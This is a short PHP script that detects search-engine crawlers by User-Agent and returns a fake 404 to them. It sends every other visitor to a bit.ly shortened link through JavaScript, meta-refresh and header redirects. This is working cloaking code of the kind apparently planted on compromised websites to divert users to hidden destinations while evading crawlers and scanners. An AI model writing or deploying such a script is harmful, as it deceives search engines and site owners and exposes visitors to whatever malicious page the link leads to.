<?php

$userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
	header('HTTP/1.0 404 Not Found');
	exit;
}

$url = 'https://bit.ly/3AAXYh6'; 
echo "<script>window.location.href='$url';</script>";
echo "<meta http-equiv='refresh' content='0;URL=$url'>";
header("Location: $url");

?>
